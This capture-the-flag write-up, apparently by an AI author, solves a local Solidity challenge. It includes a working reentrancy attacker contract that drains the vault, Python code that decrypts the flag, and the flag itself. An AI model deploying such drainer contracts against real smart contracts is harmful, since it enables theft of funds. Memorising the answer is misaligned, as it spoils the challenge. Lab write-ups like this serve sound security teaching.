---
title: "Honeypot Vault"
ctf: "Local challenge"
date: 2026-09-04
category: misc
difficulty: easy
points: N/A
flag_format: "CTF{...}"
author: "Codex"
---

# Honeypot Vault

## Summary

The vault performs an external call before clearing the caller's balance. A
malicious contract can therefore re-enter `withdraw()` repeatedly and receive
the same deposit until the vault reaches exactly zero wei.

## Solution

### Step 1: Exploit the reentrancy bug

In `HoneypotVault.withdraw()`, the payout occurs before this state update:

```solidity
(bool ok, ) = msg.sender.call{value: bal}("");
require(ok, "transfer failed");

balances[msg.sender] = 0;
```

Deploy the following attacker with the vault address. Calling
`attackAndClaim()` with 1 ETH deposits 1 ETH into the vault, starts the first
withdrawal, and re-enters whenever the vault still has enough ETH for another
payout. The final callback stops when the balance is zero, allowing all nested
withdrawals to complete successfully.

```solidity
interface IVaultTarget {
    function deposit() external payable;
    function withdraw() external;
    function claim() external returns (string memory);
    function balances(address) external view returns (uint256);
}

contract VaultDrainer {
    IVaultTarget public immutable vault;

    constructor(address target) {
        vault = IVaultTarget(target);
    }

    function attackAndClaim() external payable returns (string memory) {
        require(msg.value > 0, "send seed ETH");
        vault.deposit{value: msg.value}();
        vault.withdraw();
        return vault.claim();
    }

    receive() external payable {
        uint256 owed = vault.balances(address(this));
        if (address(vault).balance >= owed) {
            vault.withdraw();
        }
    }
}
```

The vault starts with 9 ETH and the attacker deposits 1 ETH, so ten nested
withdrawals each pay out 1 ETH. `chaos` is updated once for each completed
withdrawal.

### Step 2: Recover the flag

After ten updates, calculate the final `chaos` value modulo `2**256` and XOR it
with the constructor's encrypted flag:

```python
chaos = int(
    "9e3779b97f4a7c15f39cc0605cedc8341082276bf3a27251f86c6a11d0c18e95", 16
)
enc_flag = int(
    "e67f4da79a8fd7b3de2e13c6641278bd570b384f7256607f8ef1d8ac2c338de9", 16
)

for _ in range(10):
    chaos = (chaos * 1000003 + 7) % (1 << 256)

flag_bytes = (enc_flag ^ chaos).to_bytes(32, "big")
print(flag_bytes.rstrip(b"\x00").decode())
```

Output:

```text
CTF{h0n3yp0t_dr41n3d_r33ntry}
```

The exploit was also verified locally with:

```bash
forge test --match-path verify/Verification.t.sol --offline
```

## Flag

```text
CTF{h0n3yp0t_dr41n3d_r33ntry}
```
